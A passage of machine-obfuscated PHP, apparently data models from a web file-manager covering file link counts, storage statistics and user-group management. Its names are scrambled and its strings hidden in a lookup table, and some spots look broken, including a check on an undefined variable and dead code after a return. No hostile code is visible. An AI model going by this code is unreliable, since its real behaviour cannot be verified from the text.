remove($‡óµóÃÏ) { $this->linkCountChange($‡óµóÃÏ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Íªåçä ) { $this->linkCountChange($Íªåçä , !0); } public function linkCountChange($Úª‹¦™œ, $âşòûÀó) { $ÖØ€ŸÁë =& $_SERVER[óÔë„ú]; if (!$Úª‹¦™œ) { return; } if (!is_array($Úª‹¦™œ)) { $Úª‹¦™œ = array($Úª‹¦™œ); } $¹ÚÉ¼º = array(); foreach ($Úª‹¦™œ as $¡ÏÜ¤õş) { $†«ûÅğç = $¡ÏÜ¤õş . $ÖØ€ŸÁë[12]; if (!$¹ÚÉ¼º[$†«ûÅğç]) { $¹ÚÉ¼º[$†«ûÅğç] = 0; } $¹ÚÉ¼º[$†«ûÅğç]++; } $¥Ìşí²µ = array(); foreach ($¹ÚÉ¼º as $¡ÏÜ¤õş => $¨‘°üÁµ) { $†«ûÅğç = $¨‘°üÁµ . $ÖØ€ŸÁë[12]; if (!$¥Ìşí²µ[$†«ûÅğç]) { $¥Ìşí²µ[$†«ûÅğç] = array(); } $¥Ìşí²µ[$†«ûÅğç][] = $¡ÏÜ¤õş; } foreach ($¥Ìşí²µ as $¨‘°üÁµ => $ïÅêä”ô) { if (!$ïÅêä”ô) { continue; } $¨‘°üÁµ = $âşòûÀó ? $¨‘°üÁµ : -intval($¨‘°üÁµ); $êôÁÑÔ» = array($ÖØ€ŸÁë[541] => array($ÖØ€ŸÁë[7], $ïÅêä”ô)); if ($¨‘°üÁµ < 0) { $êôÁÑÔ»[$ÖØ€ŸÁë[2025]] = array($ÖØ€ŸÁë[1078], abs($¨‘°üÁµ)); } $this->where($êôÁÑÔ»)->setAdd($ÖØ€ŸÁë[2025], $¨‘°üÁµ); } } public function findByHash($¥Íø¹£, $ÑÜË•¥ù = false) { $Æ»¼õµ =& $_SERVER[óÔë„ú]; if (!$¥Íø¹£ && !$ÑÜË•¥ù) { return !1; } $ÉôÉÆĞÔ = array($Æ»¼õµ[2019] => $¥Íø¹£); if ($ÑÜË•¥ù) { $ÉôÉÆĞÔ = array($Æ»¼õµ[2020] => $ÑÜË•¥ù); } return $this->order($Æ»¼õµ[2026])->where($ÉôÉÆĞÔ)->find(); } public function clearEmpty($ø¬€éò = 0) { $á¹Ø ÜÎ =& $_SERVER[óÔë„ú]; $Ù£Œóğƒ = time() - 3600 * 24 * $ø¬€éò; $¿Ù¦ıîÒ = $á¹Ø ÜÎ[2027] . $Ù£Œóğƒ; $õû¾•Ä = $this->where($¿Ù¦ıîÒ)->select(); if (!$õû¾•Ä) { return; } $—¥¸ÖîÆ = new Task($á¹Ø ÜÎ[2028], $á¹Ø ÜÎ[12], count($õû¾•Ä)); foreach ($õû¾•Ä as $Üšõ‘òÄ) { $—¥¸ÖîÆ->update(1); $this->resetFile($Üšõ‘òÄ); } $—¥¸ÖîÆ->end(); } public function resetFile($Ø¤ÄÎú„) { $‹²Ôóéà =& $_SERVER[óÔë„ú]; $ûúåÍá£ = array($‹²Ôóéà[542] => $Ø¤ÄÎú„[$‹²Ôóéà[541]]); $²áÂ¢¹ = Model($‹²Ôóéà[1405])->where($ûúåÍá£)->count(); $¼ŸÅÕø’ = Model($‹²Ôóéà[2029])->where($ûúåÍá£)->count(); $¸úÜô‹Â = intval($²áÂ¢¹) + intval($¼ŸÅÕø’); if ($¸úÜô‹Â == 0) { IO::remove($Ø¤ÄÎú„[$‹²Ôóéà[87]]); Model($‹²Ôóéà[2030])->delete($Ø¤ÄÎú„[$‹²Ôóéà[541]]); $this->where($ûúåÍá£)->delete(); $this->metaSet($Ø¤ÄÎú„[$‹²Ôóéà[541]], null, null); write_log(ACTION . $‹²Ôóéà[2031] . KodUser::id() . $‹²Ôóéà[2032] . $Ø¤ÄÎú„[$‹²Ôóéà[541]] . $‹²Ôóéà[2033] . $Ø¤ÄÎú„[$‹²Ôóéà[79]] . $‹²Ôóéà[201] . $Ø¤ÄÎú„[$‹²Ôóéà[87]], $‹²Ôóéà[2034]); return; } if ($Ø¤ÄÎú„[$‹²Ôóéà[2025]] != $¸úÜô‹Â) { $this->where($ûúåÍá£)->save(array($‹²Ôóéà[2018] => $¸úÜô‹Â)); } } public function storageInfo($˜¤ú÷ø = false) { $š­¡óı =& $_SERVER[óÔë„ú]; $»–êÊ¿˜ = $this->count() + 0.0; $¸×º–î¦ = 0; $‚ê ö—Û = 1; $ƒ€¢ë®µ = 0; $ğÖë«ÙÆ = 5000; for ($Üå¥öÀ£ = 0; $Üå¥öÀ£ < $»–êÊ¿˜; $Üå¥öÀ£ = $Üå¥öÀ£ + $ğÖë«ÙÆ) { $»ĞŒ¤ = $this->limit($Üå¥öÀ£, $Üå¥öÀ£ + $ğÖë«ÙÆ)->select(); foreach ($»ĞŒ¤ as $½ıÛ³Á) { $‚ê ö—Û += $½ıÛ³Á[$š­¡óı[79]] * $½ıÛ³Á[$š­¡óı[2025]]; $¸×º–î¦ += $½ıÛ³Á[$š­¡óı[79]] * ($½ıÛ³Á[$š­¡óı[2025]] - 1); $ƒ€¢ë®µ += $½ıÛ³Á[$š­¡óı[2025]]; } } $Ûåˆ—åë = array($š­¡óı[2035] => $‚ê ö—Û, $š­¡óı[2036] => $¸×º–î¦, $š­¡óı[2037] => $¸×º–î¦ / $‚ê ö—Û, $š­¡óı[83] => $»–êÊ¿˜, $š­¡óı[2038] => $ƒ€¢ë®µ); return $Ûåˆ—åë; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\x6d\x65" => "\x67\162\x6f\165\x70\137\155\145\x74\141", "\x6d\145\x74\x61\106\151\145\x6c\x64" => "\x67\x72\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($Ğô”ÔÂ) { $ŠéŸñ¡“ =& $_SERVER[óÔë„ú]; return array($ŠéŸñ¡“[2039] => array($Ğô”ÔÂ[0], $ŠéŸñ¡“[2040]), $ŠéŸñ¡“[2041] => array($Ğô”ÔÂ[0], $ŠéŸñ¡“[2042])); } protected function getInfo($æ–¶Œú, $ˆ ¡…§ = false) { $ÂÖèÏÒ = $this->getInfoSimple($æ–¶Œú); if (!$ÂÖèÏÒ) { return !1; } if ($ˆ ¡…§) { return $this->_listDataApplyItem($ÂÖèÏÒ); } return $this->cacheFunctionGet($_SERVER[óÔë„ú][2043], $æ–¶Œú); } protected function getInfoSimple($Ô³Ìî°æ, $£áº…”Ë = false) { $÷Â¬¯é÷ =& $_SERVER[óÔë„ú]; if ($£áº…”Ë) { $ªÁÜŸÇä = array($÷Â¬¯é÷[1957] => intval($Ô³Ìî°æ)); $šÕĞº¾Ÿ = $this->where($ªÁÜŸÇä)->find(); return is_array($šÕĞº¾Ÿ) ? $šÕĞº¾Ÿ : array(); } return $this->cacheFunctionGet($÷Â¬¯é÷[2044], $Ô³Ìî°æ); } protected function groupAdd($®—ÄÕşì) { $¡‘²¾à™ =& $_SERVER[óÔë„ú]; if (!$®—ÄÕşì[$¡‘²¾à™[192]] && isset($®—ÄÕşì[$¡‘²¾à™[1957]]) && $®—ÄÕşì[$¡‘²¾à™[1957]] == 1) { if ($Ñõ“æ÷È = $this->getInfoSimple($®—ÄÕşì[$¡‘²¾à™[1957]], !0)) { return $®—ÄÕşì[$¡‘²¾à™[1957]]; } } else { $Ñõ“æ÷È = $this->getInfoSimple($®—ÄÕşì[$¡‘²¾à™[192]]); if (!$Ñõ“æ÷È) { return !1; } } $¢¿øê«“ = $¡‘²¾à™[594]; if ($Ñõ“æ÷È[$¡‘²¾à™[584]]) { $¢¿øê«“ = $Ñõ“æ÷È[$¡‘²¾à™[584]] . $Ñõ“æ÷È[$¡‘²¾à™[1957]] . $¡‘²¾à™[50]; } $È×®ïŠ‰ = array($¡‘²¾à™[494] => $this->groupNameAuto($®—ÄÕşì[$¡‘²¾à™[192]], $®—ÄÕşì[$¡‘²¾à™[32]]), $¡‘²¾à™[477] => $®—ÄÕşì[$¡‘²¾à™[192]], $¡‘²¾à™[652] => $¢¿øê«“, $¡‘²¾à™[2045] => $®—ÄÕşì[$¡‘²¾à™[1943]], $¡‘²¾à™[2046] => 0, $¡‘²¾à™[1961] => 0); if (isset($®—ÄÕşì[$¡‘²¾à™[1981]])) { $È×®ïŠ‰[$¡‘²¾à™[1981]] = $®—ÄÕşì[$¡‘²¾à™[1981]]; } else { $ßË—ß¸˜ = $this->max($¡‘²¾à™[1981]); if (!$ßË—ß¸˜) { $ßË—ß¸˜ = 0; } $È×®ïŠ‰[$¡‘²¾à™[1981]] = $ßË—ß¸˜ + 1; } if (!empty($®—ÄÕşì[$¡‘²¾à™[1957]])) { $È×®ïŠ‰[$¡‘²¾à™[1957]] = $®—ÄÕşì[$¡‘²¾à™[1957]]; } $Áûí§± = $this->add($È×®ïŠ‰); $this->setNamePinyin($Áûí§±, $È×®ïŠ‰[$¡‘²¾à™[32]]); if (isset($®—ÄÕşì[$¡‘²¾à™[2047]])) { $this->metaSet($Áûí§±, array($¡‘²¾à™[2047] => $®—ÄÕşì[$¡‘²¾à™[2047]], $¡‘²¾à™[2048] => $®—ÄÕşì[$¡‘²¾à™[2048]])); unset($®—ÄÕşì[$¡‘²¾à™[2047]]); unset($®—ÄÕşì[$¡‘²¾à™[2048]]); } Model($¡‘²¾à™[1405])->groupRootAdd($Áûí§±); $this->_clearCache($®—ÄÕşì[$¡‘²¾à™[192]]); return $Áûí§±; } protected function groupEdit($ÏĞ¡Â·, $•Œ²Ùœ”) { $¦‹›“Î =& $_SERVER[óÔë„ú]; $ÚÄÛÑ÷ = $this->getInfoSimple($ÏĞ¡Â·); if (!$ÚÄÛÑ÷) { return !1; } if (!empty($•Œ²Ùœ”[$¦‹›“Î[192]])) { $Èâ·•Û = $this->getInfoSimple($•Œ²Ùœ”[$¦‹›“Î[192]]); if (!$Èâ·•Û) { return !1; } if ($ÚÄÛÑ÷[$¦‹›“Î[1957]] == $Èâ·•Û[$¦‹›“Î[1957]]) { return !1; } if ($•Œ²Ùœ”[$¦‹›“Î[192]] != $ÚÄÛÑ÷[$¦‹›“Î[192]]) { if ($Èâ·•Û[$¦‹›“Î[584]] !== $ÚÄÛÑ÷[$¦‹›“Î[584]] && strpos($Èâ·•Û[$¦‹›“Î[584]], $ÚÄÛÑ÷[$¦‹›“Î[584]] . $ÚÄÛÑ÷[$¦‹›“Î[1957]] . $¦‹›“Î[50]) === 0) { return !1; } $•Œ²Ùœ”[$¦‹›“Î[652]] = $Èâ·•Û[$¦‹›“Î[584]] . $•Œ²Ùœ”[$¦‹›“Î[192]] . $¦‹›“Î[50]; $this->_changeChildLevel($ÚÄÛÑ÷, $Èâ·•Û); $this->_clearCache($Èâ·•Û[$¦‹›“Î[1957]]); $this->_clearCache($ÚÄÛÑ÷[$¦‹›“Î[192]]); } } if (isset($•Œ²Ùœ”[$¦‹›“Î[32]])) { $this->setNamePinyin($ÏĞ¡Â·, $•Œ²Ùœ”[$¦‹›“Î[32]]); } if (isset($•Œ²Ùœ”[$¦‹›“Î[2047]])) { $this->metaSet($ÏĞ¡Â·, array($¦‹›“Î[2047] => $•Œ²Ùœ”[$¦‹›“Î[2047]], $¦‹›“Î[2048] => $•Œ²Ùœ”[$¦‹›“Î[2048]])); unset($•Œ²Ùœ”[$¦‹›“Î[2047]]); unset($•Œ²Ùœ”[$¦‹›“Î[2048]]); } $this->_clearChildrenCache($ÚÄÛÑ÷); return $this->where(array($¦‹›“Î[2049] => $ÏĞ¡Â·))->save($•Œ²Ùœ”); } private function _clearChildrenCache($Ó»¾à“±) { $ùø¤„  =& $_SERVER[óÔë„ú]; $ÑÉ‰©‘ = array($ùø¤„ [652] => array($ùø¤„ [612], $Ó»¾à“±[$ùø¤„ [584]] . $Ó»¾à“±[$ùø¤„ [1957]] . $ùø¤„ [613])); $Î·ı‘‡Ê = $this->field($ùø¤„ [1957])->where($ÑÉ‰©‘)->select(); foreach ($Î·ı‘‡Ê as $’ÕÀ¯÷­) { $this->_clearCache($’ÕÀ¯÷­[$ùø¤„ [1957]]); } } private function _clearCache($¾’ä…•‡) { $•˜àŸ¤ =& $_SERVER[óÔë„ú]; $this->cacheFunctionClear($•˜àŸ¤[2043], $¾’ä…•‡); $this->cacheFunctionClear($•˜àŸ¤[2044], $¾’ä…•‡); } private function _changeChildLevel($¨Öù©î, $åõÊó¦, $îãŸ Ì = false) { $íôË­íš =& $_SERVER[óÔë„ú]; $–•˜èâ° = $¨Öù©î[$íôË­íš[584]] . $¨Öù©î[$íôË­íš[1957]] . $íôË­íš[50]; $ŒªíÏƒ = $åõÊó¦[$íôË­íš[584]] . $åõÊó¦[$íôË­íš[1957]] . $íôË­íš[50] . $¨Öù©î[$íôË­íš[1957]] . $íôË­íš[50]; if ($îãŸ Ì) { $ŒªíÏƒ = $åõÊó¦[$íôË­íš[584]] . $åõÊó¦[$íôË­íš[1957]] . $íôË­íš[50]; } $üªü¹ºº = array($íôË­íš[652] => array($íôË­íš[612], $¨Öù©î[$íôË­íš[584]] . $¨Öù©î[$íôË­íš[1957]] . $íôË­íš[613])); $“®†»ßí = array($íôË­íš[652] => array($íôË­íš[661], "\162\145\x70\x6c\x61\x63\145\50\x70\x61\x72\145\x6e\164\x4c\145\166\x65\154\x2c\x27{$–•˜èâ°}\x27\x2c\47{$ŒªíÏƒ}\47\x29")); $this->_clearChildrenCache($¨Öù©î); $this->where($üªü¹ºº)->data($“®†»ßí)->save(); } public function setNamePinyin($äø–ó©ô, $ºâˆ†Üí = false) { $Ü–ïÉ€ =& $_SERVER[óÔë„ú]; if (!$ºâˆ†Üí) { $Ëß‘¾ô = $this->getInfoSimple($äø–ó©ô); $ºâˆ†Üí = $Ëß‘¾ô[$Ü–ïÉ€[32]]; } if (!Input::check($ºâˆ†Üí, $Ü–ïÉ€[655])) { $this->metaSet($äø–ó©ô, $Ü–ïÉ€[538], null); $this->metaSet($äø–ó©ô, $Ü–ïÉ€[537], null); return; } $¦¹àü‹¨ = array($Ü–ïÉ€[538] => str_replace($Ü–ïÉ€[53], $Ü–ïÉ€[12], Pinyin::get($ºâˆ†Üí)), $Ü–ïÉ€[537] => Pinyin::get($ºâˆ†Üí, $Ü–ïÉ€[656])); $this->metaSet($äø–ó©ô, $¦¹àü‹¨); } protected function groupStatus($í¯îöí›, $†¸²Æ¹Ù) { $ß¹é«ó” =& $_SERVER[óÔë„ú]; $­´Ïã›  = $this->getInfoSimple($í¯îöí›); if (!$­´Ïã› ) { return !1; } $this->_clearCache($í¯îöí›); return $this->metaSet($í¯îöí›, $ß¹é«ó”[810], $†¸²Æ¹Ù); if ($†¸²Æ¹Ù == $ß¹é«ó”[91]) { $ÚÏ¶—Ô = $this->parentLevelArray($­´Ïã› [$ß¹é«ó”[584]]); } else { } $ÚÏ¶—Ô[] = $­´Ïã› [$ß¹é«ó”[1957]]; $Æ²ÕØ‘å = array(); foreach ($ÚÏ¶—Ô as $í¯îöí›) { $Æ²ÕØ‘å[] = array($ß¹é«ó”[1957] => $í¯îöí›, $ß¹é«ó”[97] => $ß¹é«ó”[810], $ß¹é«ó”[450] => $†¸²Æ¹Ù); $this->_clearCache($í¯îöí›); } return Model($ß¹é«ó”[2050])->addAll($Æ²ÕØ‘å, array(), !0); } protected function groupRemove($–‡îæ‡, $‹¼£œš = false) { $½µÄûßò =& $_SERVER[óÔë„ú]; $¶Ï†Ü” = array($½µÄûßò[1957] => $–‡îæ‡); $–¯ÒÑ = $this->where($¶Ï†Ü”)->find(); if (!$–¯ÒÑ || $–¯ÒÑ[$½µÄûßò[192]] == 0) { return !1; } if (!$‹¼£œš) { $úé®˜©è = $this->getInfoSimple($–¯ÒÑ[$½µÄûßò[192]]); $this->_changeChildLevel($–¯ÒÑ, $úé®˜©è, !0); $this->where(array($½µÄûßò[192] => $–‡îæ‡))->save(array($½µÄûßò[192] => $–¯ÒÑ[$½µÄûßò[192]])); $this->_clearCache($úé®˜©è[$½µÄûßò[1957]]); } Model($½µÄûßò[2050])->where($¶Ï†Ü”)->delete(); Model($½µÄûßò[2051])->where($¶Ï†Ü”)->delete(); Model($½µÄûßò[884])->groupRootRemove($–‡îæ‡); $this->_clearCache($–¯ÒÑ[$½µÄûßò[192]]); return $this->where($¶Ï†Ü”)->delete(); } protected function groupSort($±úóÅû°) { $ï‹Èè²ü =& $_SERVER[óÔë„ú]; $ıõ‰ˆ® = array(); foreach ($±úóÅû° as $·Î¶›Œ’ => $ˆÏå«×) { $ıõ‰ˆ®[] = array($ï‹Èè²ü[1957], $ˆÏå«×, $ï‹Èè²ü[1981], $·Î¶›Œ’ + 1); } $this->saveAll($ıõ‰ˆ®); } public function listData() { $İ£›ÚüÖ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($İ£›ÚüÖ[$_SERVER[óÔë„ú][445]]); return $İ£›ÚüÖ; } private function _makeOrder($Ûêõ³éù = '') { $Ñæéæ =& $_SERVER[óÔë„ú]; $îæşàÔ = array($Ñæéæ[1957], $Ñæéæ[32], $Ñæéæ[1945], $Ñæéæ[231]); $´±‹­ñ¶ = array($Ñæéæ[523] => $Ñæéæ[524], $Ñæéæ[525] => $Ñæéæ[526]); $¯ú»‚Õ = Input::get($Ñæéæ[530], $Ñæéæ[7], $Ñæéæ[1961], $îæşàÔ); $›—¼Éüì = Input::get($Ñæéæ[531], $Ñæéæ[7], $Ñæéæ[2052], array($Ñæéæ[2052], $Ñæéæ[525])); $›—¼Éüì = $´±‹­ñ¶[$›—¼Éüì]; $Ûêõ³éù = $Ûêõ³éù . "{$¯ú»‚Õ}\40{$›—¼Éüì}\54\40\147\162\x6f\165\160\x49\x44\40\x61\x73\143"; return $this->order($Ûêõ³éù); } public function listChild($¸“ŠÌ ’) { $§Ë‹èÎÚ =& $_SERVER[óÔë„ú]; $™æ²«À¶ = $this->where(array($§Ë‹èÎÚ[192] => $¸“ŠÌ ’))->_makeOrder()->selectPage(200); $this->_listDataApply($™æ²«À¶[$§Ë‹èÎÚ[445]]); return $™æ²«À¶; } public function listChildIds($¤áÒåå) { $Áº²Ñ¡Ö =& $_SERVER[óÔë„ú]; if (is_string($ÓÁÅ Ò¬)) { $¤áÒåå = explode($Áº²Ñ¡Ö[50], $¤áÒåå); } $ıÔ®úûø = $this->where(array($Áº²Ñ¡Ö[1957] => array($Áº²Ñ¡Ö[7], $¤áÒåå)))->field($Áº²Ñ¡Ö[2053])->select(); if (!$ıÔ®úûø) { return !1; } $•Âç‚‹Ø = array(); foreach ($ıÔ®úûø as $·ªã¡) { $•Âç‚‹Ø[] = "\x73\145\x6c\145\143\164\x20\147\x72\157\x75\160\x49\104\x20\x66\162\x6f\x6d\x20\140\147\x72\x6f\165\160\140\x20\167\x68\145\162\145\x20\x70\141\162\x65\x6e\x74\114\x65\x76\145\154\40\154\x69\x6b\x65\40\47{$·ªã¡[$Áº²Ñ¡Ö[584]]}{$·ªã¡[$Áº²Ñ¡Ö[1957]]}\x2c\45\47"; } $•Âç‚‹Ø = implode($Áº²Ñ¡Ö[2054], $•Âç‚‹Ø); $ıÔ®úûø = $this->query($•Âç‚‹Ø); if (!$ıÔ®úûø) { return array(); } $¤áÒåå = array_to_keyvalue($ıÔ®úûø, $Áº²Ñ¡Ö[12], $Áº²Ñ¡Ö[1957]); return array_unique($¤áÒåå); } public function listByID($ ÕØóÀ) { $×ÆôØšÌ =& $_SERVER[óÔë„ú]; if (!$ ÕØóÀ) { return array(); } $ğ æÂæı = array($×ÆôØšÌ[1957] => array($×ÆôØšÌ[7], $ ÕØóÀ)); $êûşğÎè = $this->where($ğ æÂæı)->select(); $êûşğÎè = array_sort_keep($êûşğÎè, $×ÆôØšÌ[1957], $ ÕØóÀ); $this->_listDataApply($êûşğÎè); return $êûşğÎè; } public function listSearch($ºÔ¨ìÎÈ) { $÷ĞÛµÉ =& $_SERVER[óÔë„ú]; $£€äõ¼ = trim($ºÔ¨ìÎÈ[$÷ĞÛµÉ[2055]]); $áóÌí‘ = explode($÷ĞÛµÉ[53], $£€äõ¼); if (!$£€äõ¼ || count($áóÌí‘) == 1) { return $this->listSearchNow($ºÔ¨ìÎÈ); } $¥£™²ı = array($÷ĞÛµÉ[445] => array()); foreach ($áóÌí‘ as $Ä¤Ğš³î) { if (!trim($Ä¤Ğš³î)) { continue; } $ºÔ¨ìÎÈ[$÷ĞÛµÉ[2055]] = $Ä¤Ğš³î; $Ú·Ì·—í = $this->listSearchNow($ºÔ¨ìÎÈ); $¥£™²ı[$÷ĞÛµÉ[445]] = array_merge($¥£™²ı[$÷ĞÛµÉ[445]], $Ú·Ì·—í[$÷ĞÛµÉ[445]]); } $¥£™²ı[$÷ĞÛµÉ[445]] = array_unique_by_key($¥£™²ı[$÷ĞÛµÉ[445]], $÷ĞÛµÉ[1957]); $¥£™²ı[$÷ĞÛµÉ[442]] = array($÷ĞÛµÉ[443] => count($¥£™²ı[$÷ĞÛµÉ[445]]), $÷ĞÛµÉ[439] => 20, $÷ĞÛµÉ[429] => 1, $÷ĞÛµÉ[444] => 1); return $¥£™²ı; } public function listSearchNow($â¹ú¬“) { $–È ·€ä =& $_SERVER[óÔë„ú]; $÷¶º§ÉÚ = trim($â¹ú¬“[$–È ·€ä[2055]]); $¶«áúÜÖ = isset($â¹ú¬“[$–È ·€ä[2056]]) ? $â¹ú¬“[$–È ·€ä[2056]] : !1; if (!trim($÷¶º§ÉÚ)) { return !1; } $÷¶º§ÉÚ = str_replace($–È ·€ä[2057], $–È ·€ä[2058], $÷¶º§ÉÚ); $÷—ª¾Ì÷ = array($–È ·€ä[1957] => array($–È ·€ä[459], "{$÷¶º§ÉÚ}\x25"), $–È ·€ä[32] => array($–È ·€ä[459], "\x25{$÷¶º§ÉÚ}\45"), $–È ·€ä[1063] => $–È ·€ä[2059]); if ($¶«áúÜÖ) { $Ğìö„‚ô = $this->getInfoSimple($¶«áúÜÖ); $Ÿƒ‚‰®² = $Ğìö„‚ô[$–È ·€ä[584]] . $¶«áúÜÖ . $–È ·€ä[613]; $÷—ª¾Ì÷ = array($÷—ª¾Ì÷, array($–È ·€ä[584] => array($–È ·€ä[459], $Ÿƒ‚‰®²))); } $÷—ª¾Ì÷ = $this->parseWhereLike($÷—ª¾Ì÷); $°ıÉª´ = $this->_makeOrder()->where($÷—ª¾Ì÷)->selectPage(20); $°ıÉª´ = $°ıÉª´ ? $°ıÉª´ : array($–È ·€ä[445] => array(), $–È ·€ä[442] => array()); if (!$°ıÉª´ || count($°ıÉª´[$–È ·€ä[445]]) < 5 && Input::check($÷¶º§ÉÚ, $–È ·€ä[394])) { $›ò´ŠÆ¢ = $this->groupChildrenAll($¶«áúÜÖ); $µÂµÒŞ = $this->_searchFromMeta($–È ·€ä[537], $÷¶º§ÉÚ, 10, $›ò´ŠÆ¢); $ğ½™Õ¸„ = $this->_searchFromMeta($–È ·€ä[538], $÷¶º§ÉÚ, 10, $›ò´ŠÆ¢); $îŞ·€Ù˜ = array_merge($µÂµÒŞ, $ğ½™Õ¸„, $°ıÉª´[$–È ·€ä[445]]); $°ıÉª´[$–È ·€ä[445]] = array_unique_by_key($îŞ·€Ù˜, $–È ·€ä[1957]); $°ıÉª´[$–È ·€ä[442]][$–È ·€ä[443]] = count($°ıÉª´[$–È ·€ä[445]]); $°ıÉª´[$–È ·€ä[442]][$–È ·€ä[444]] = ceil($°ıÉª´[$–È ·€ä[442]][$–È ·€ä[443]] / $°ıÉª´[$–È ·€ä[442]][$–È ·€ä[439]]); } $this->_listDataApply($°ıÉª´[$–È ·€ä[445]]); return $°ıÉª´; } protected function groupChildrenAll($ûåÜ—·Ø) { $¿şä¿µ× =& $_SERVER[óÔë„ú]; if (!$ûåÜ—·Ø) { return !1; } if (!is_array($ûåÜ—·Ø)) { $ûåÜ—·Ø = array($ûåÜ—·Ø); } $¬Ôğäş« = $ûåÜ—·Ø; foreach ($ûåÜ—·Ø as $Öæ­¢©ƒ) { $‡¼’Úå = $this->getInfoSimple($Öæ­¢©ƒ); $È—Æ”¹Æ = array($¿şä¿µ×[584] => array($¿şä¿µ×[459], $‡¼’Úå[$¿şä¿µ×[584]] . $Öæ­¢©ƒ . $¿şä¿µ×[613])); $Äô®Ç© = $this->field($¿şä¿µ×[1957])->where($È—Æ”¹Æ)->select(); $¬Ôğäş« = array_merge($¬Ôğäş«, array_to_keyvalue($Äô®Ç©, $¿şä¿µ×[12], $¿şä¿µ×[1957])); } return array_unique($¬Ôğäş«); } private function _searchFromMeta($Á³“†¿í, $¬Òş±¥, $¹İœ÷, $¹şÍøöá) { $’àŞæ¶è =& $_SERVER[óÔë„ú]; $¬Òş±¥ = strtolower($¬Òş±¥); $ü‰ÊšèÎ = array($’àŞæ¶è[97] => $Á³“†¿í, $’àŞæ¶è[450] => array($’àŞæ¶è[459], "\45{$¬Òş±¥}\45")); $ü‰ÊšèÎ = $this->parseWhereLike($ü‰ÊšèÎ); if ($¹şÍøöá) { $ü‰ÊšèÎ[$’àŞæ¶è[1957]] = array($’àŞæ¶è[7], $¹şÍøöá); } $°àù—¸‚ = Model($’àŞæ¶è[2060])->where($ü‰ÊšèÎ)->limit($¹İœ÷)->select(); if (!$°àù—¸‚) { return array(); } $°àù—¸‚ = array_to_keyvalue($°àù—¸‚, $’àŞæ¶è[12], $’àŞæ¶è[1957]); $™—æ˜İö = $this->where(array($’àŞæ¶è[2049] => array($’àŞæ¶è[7], $°àù—¸‚)))->select(); if (!$™—æ˜İö) { return array(); } return $™—æ˜İö; } protected function _listDataApplyItem($²Ğé†Øô) { $Åèû¥È = array($²Ğé†Øô); $this->_listDataApply($Åèû¥È); return $Åèû¥È[0]; } protected function _listDataApply(&$†ìÎîî³) { $Éª°ş¥µ =& $_SERVER[óÔë„ú]; if (!$†ìÎîî³) { return; } $€®¤Ú­Ê = array_to_keyvalue($†ìÎîî³, $Éª°ş¥µ[12], $Éª°ş¥µ[1957]); $this->_listAppendChildren($†ìÎîî³); $this->_listAppendChildrenMember($†ìÎîî³); $this->_listAppendMeta($†ìÎîî³, $€®¤Ú­Ê); $this->_listAppendParent($†ìÎîî³); $this->_listAppendSourceRoot($†ìÎîî³, $€®¤Ú­Ê); } private function _listAppendChildren(&$ºÏÈšæ) { $ÀıÜùª‰ =& $_SERVER[óÔë„ú]; $µ¤”‚ = array_to_keyvalue($ºÏÈšæ, $ÀıÜùª‰[12], $ÀıÜùª‰[1957]); $Ì©±Ğ = array($ÀıÜùª‰[192] => array($ÀıÜùª‰[7], $µ¤”‚)); $©å„†š¸ = array($ÀıÜùª‰[192], $ÀıÜùª‰[2061] => $ÀıÜùª‰[565]); $¬¾ã·¦º = $this->field($©å„†š¸)->where($Ì©±Ğ)->group($ÀıÜùª‰[192])->select(); $ôßÏ‰ÇÖ = array_to_keyvalue($¬¾ã·¦º, $ÀıÜùª‰[192], $ÀıÜùª‰[565]); foreach ($ºÏÈšæ as &$ûğü‡¹Ã) { $Ç¦™ù» = $ûğü‡¹Ã[$ÀıÜùª‰[1957]]; $ûğü‡¹Ã[$ÀıÜùª‰[2062]] = isset($ôßÏ‰ÇÖ[$Ç¦™ù»]) ? intval($ôßÏ‰ÇÖ[$Ç¦™ù»]) : !1; } unset($ûğü‡¹Ã); } private function _listAppendChildrenMember(&$û…ºâ¦“) { $§®©òı€ =& $_SERVER[óÔë„ú]; $ÇìßİÆŞ = array_to_keyvalue($û…ºâ¦“, $§®©òı€[12], $§®©òı€[1957]); $©ĞáœÏÌ = array($§®©òı€[1957] => array($§®©òı€[7], $ÇìßİÆŞ)); $¿‚¡—½ä = array($§®©òı€[1957], $§®©òı€[2061] => $§®©òı€[565]); $Îâå¸ŞÅ = Model($§®©òı€[2051])->field($¿‚¡—½ä)->where($©ĞáœÏÌ)->group($§®©òı€[1957])->select(); $Í°´õ¥§ = array_to_keyvalue($Îâå¸ŞÅ, $§®©òı€[1957], $§®©òı€[565]); foreach ($û…ºâ¦“ as &$“ôïÉÚˆ) { $ÃÚñ…’ = $“ôïÉÚˆ[$§®©òı€[1957]]; $“ôïÉÚˆ[$§®©òı€[2063]] = isset($Í°´õ¥§[$ÃÚñ…’]) ? intval($Í°´õ¥§[$ÃÚñ…’]) : !1; } unset($“ôïÉÚˆ); } private function _listAppendMeta(&$Á®ùÂ, $¤ƒÙ£ŠÍ) { $…¡¸½è¦ =& $_SERVER[óÔë„ú]; $íÛáåÀµ = array($…¡¸½è¦[1957] => array($…¡¸½è¦[7], $¤ƒÙ£ŠÍ)); $ÖÈÔÁ² = Model($…¡¸½è¦[2050])->where($íÛáåÀµ)->select(); $ÖÈÔÁ² = array_to_keyvalue_group($ÖÈÔÁ², $…¡¸½è¦[1957]); foreach ($ÖÈÔÁ² as &$£Ôş½ó–) { $£Ôş½ó– = array_to_keyvalue($£Ôş½ó–, $…¡¸½è¦[97], $…¡¸½è¦[450]); } unset($£Ôş½ó–); foreach ($Á®ùÂ as &$š½â¡ô·) { $š½â¡ô·[$…¡¸½è¦[539]] = array(); if (isset($ÖÈÔÁ²[$š½â¡ô·[$…¡¸½è¦[1957]]])) { $š½â¡ô·[$…¡¸½è¦[539]] = $ÖÈÔÁ²[$š½â¡ô·[$…¡¸½è¦[1957]]]; } } unset($š½â¡ô·); } protected function parentLevelArray($øúô†Áö) { $À®ı©Ğ =& $_SERVER[óÔë„ú]; $øúô†Áö = explode($À®ı©Ğ[50], trim($øúô†Áö, $À®ı©Ğ[50])); $øúô†Áö = array_remove_value($øúô†Áö, $À®ı©Ğ[228]); return $øúô†Áö; } protected function parentInGroup($œƒìÇ”, $•‡àƒ‡) { $†ô§Ÿ” =& $_SERVER[óÔë„ú]; $»ËÁ¶° = $this->getInfoSimple($œƒìÇ”); if (!$»ËÁ¶°) { return !0; } 